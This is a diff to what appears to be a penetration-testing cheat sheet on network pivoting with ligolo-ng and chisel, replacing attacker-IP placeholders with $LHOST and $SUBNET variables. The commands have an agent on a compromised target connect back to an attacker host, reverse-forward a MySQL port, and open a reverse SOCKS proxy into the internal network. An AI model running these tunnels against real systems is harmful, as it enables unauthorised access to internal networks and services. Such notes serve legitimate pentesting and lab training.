@@ -38,7 +38,7 @@ sudo ip link set ligolo up
 ### 4. Start Agent (Target)
 
 ```bash
-.\agent.exe -connect <attacker-ip>:9001 -ignore-cert
+.\agent.exe -connect $LHOST:9001 -ignore-cert
 ```
 
 ### 5. Establish the Tunnel
@@ -52,7 +52,7 @@ ligolo-ng >> start
 ### 6. Add Route to Internal Network
 
 ```bash
-sudo ip route add 172.16.4.0/24 dev ligolo
+sudo ip route add $SUBNET dev ligolo
 ```
 
 ### Adding Listeners
@@ -85,7 +85,7 @@ chisel server -p 8080 --reverse
 ### 3. Start Client (Target): Single Port Forward
 
 ```bash
-.\chisel.exe client <attacker-ip>:8080 R:3306:127.0.0.1:3306
+.\chisel.exe client $LHOST:8080 R:3306:127.0.0.1:3306
 ```
 
 ### 4. Connect to Forwarded Service
@@ -97,7 +97,7 @@ mysql -h 127.0.0.1 -P 3306 -u root -p
 ### SOCKS5 Proxy Mode
 
 ```bash
-.\chisel.exe client <attacker-ip>:8080 R:socks
+.\chisel.exe client $LHOST:8080 R:socks
 ```
 
 Add to `/etc/proxychains4.conf`:
